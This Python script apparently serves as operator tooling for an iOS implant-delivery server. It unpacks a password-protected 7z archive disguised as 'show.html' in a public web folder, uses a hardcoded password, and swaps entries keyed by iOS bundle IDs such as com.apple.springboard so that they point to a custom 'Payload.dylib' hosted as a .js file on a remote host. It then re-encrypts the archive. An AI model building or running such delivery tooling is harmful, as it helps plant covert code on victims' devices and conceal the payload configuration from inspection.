#!/usr/bin/env python3
"""把打包好的自研 dylib 挂进 show.html 的 entries。

用法:
    # 1) 看现在的 entries
    python tools/update_show.py --list

    # 2) 把 com.apple.springboard 换成我们的 px1.js（先跑 pack.py 拿到 sha256/size）
    python tools/update_show.py --bundle com.apple.springboard --name px1 \
        --sha256 <sha> --size <size>

    # 3) 或者只改 URL，hash/size 从本地 dylib 现算
    python tools/update_show.py --bundle com.apple.springboard --name px1 --dylib out/Payload.dylib

改完会自动备份成 show.html.bak.<时间戳>，并验证新包能被解开。
"""
import sys, os, json, time, shutil, hashlib
import py7zr

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

PASSWORD = "abf3bdc8e239c0f3183c257f9ccc23e8"
ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
# 想先在副本上试就跑：SHOW_HTML=/path/to/copy.html python tools/update_show.py ...
SHOW = os.environ.get("SHOW_HTML") or os.path.join(ROOT, "delivery-web", "public", "details", "show.html")
HOST = "[HOST_PLACEHOLDER]"


def load():
    import tempfile
    tmp = tempfile.mkdtemp(prefix="show_")
    with py7zr.SevenZipFile(SHOW, "r", password=PASSWORD) as z:
        z.extractall(path=tmp)
    cfg = json.load(open(os.path.join(tmp, "config.json"), encoding="utf-8"))
    return cfg, tmp


def save(cfg):
    import tempfile
    ts = time.strftime("%Y%m%d_%H%M%S")
    bak = "%s.bak.%s" % (SHOW, ts)
    shutil.copy2(SHOW, bak)
    print("已备份 ->", os.path.basename(bak))

    tmp = tempfile.mkdtemp(prefix="showout_")
    cp = os.path.join(tmp, "config.json")
    json.dump(cfg, open(cp, "w", encoding="utf-8"), ensure_ascii=False, indent=2)

    out = os.path.join(tmp, "show.7z")
    with py7zr.SevenZipFile(out, "w", password=PASSWORD, header_encryption=True) as z:
        z.write(cp, "config.json")

    # 自校验
    v = os.path.join(tmp, "v")
    os.makedirs(v, exist_ok=True)
    with py7zr.SevenZipFile(out, "r", password=PASSWORD) as z:
        names = z.getnames()
        z.extractall(path=v)
    back = json.load(open(os.path.join(v, "config.json"), encoding="utf-8"))
    assert len(back["entries"]) == len(cfg["entries"]), "entries 数量对不上"
    print("自校验 ✓  内含=%s  entries=%d" % (names, len(back["entries"])))

    shutil.copy2(out, SHOW)
    print("已写入 ->", SHOW, os.path.getsize(SHOW), "B")


def main():
    av = sys.argv[1:]

    if "--list" in av or not av:
        cfg, _ = load()
        print("core.url =", cfg["core"]["url"])
        print("core.sha256 =", cfg["core"]["sha256"], " size =", cfg["core"]["size"])
        print()
        print("%-3s %-42s %-14s %10s  %s" % ("#", "bundleId", "文件", "size", "sha256前12"))
        for i, e in enumerate(cfg["entries"]):
            fn = e["url"].rsplit("/", 1)[-1]
            print("%-3d %-42s %-14s %10d  %s" % (
                i + 1, e.get("bundleId", ""), fn, e.get("size", 0), e.get("sha256", "")[:12]))
        return

    def opt(key, default=None):
        return av[av.index(key) + 1] if key in av else default

    bundle = opt("--bundle")
    name = opt("--name")
    dylib = opt("--dylib")
    sha = opt("--sha256")
    size = opt("--size")

    if not bundle or not name:
        print("需要 --bundle 和 --name，用 --list 看现有 entries")
        sys.exit(2)

    if dylib:
        raw = open(dylib, "rb").read()
        sha = hashlib.sha256(raw).hexdigest()
        size = str(len(raw))
        print("从 dylib 算得 sha256=%s size=%s" % (sha, size))

    if not sha or not size:
        print("需要 --sha256 和 --size，或者给 --dylib")
        sys.exit(2)

    cfg, _ = load()
    hit = None
    for e in cfg["entries"]:
        if e.get("bundleId") == bundle:
            hit = e
            break

    if hit is None:
        print("entries 里没有 bundleId =", bundle)
        sys.exit(1)

    print("原 entry:", json.dumps({k: hit.get(k) for k in ("url", "sha256", "size")}, ensure_ascii=False))
    hit["url"] = "http://%s/details/%s.js" % (HOST, name)
    hit["sha256"] = sha
    hit["size"] = int(size)
    print("新 entry:", json.dumps({k: hit.get(k) for k in ("url", "sha256", "size")}, ensure_ascii=False))

    save(cfg)


if __name__ == "__main__":
    main()
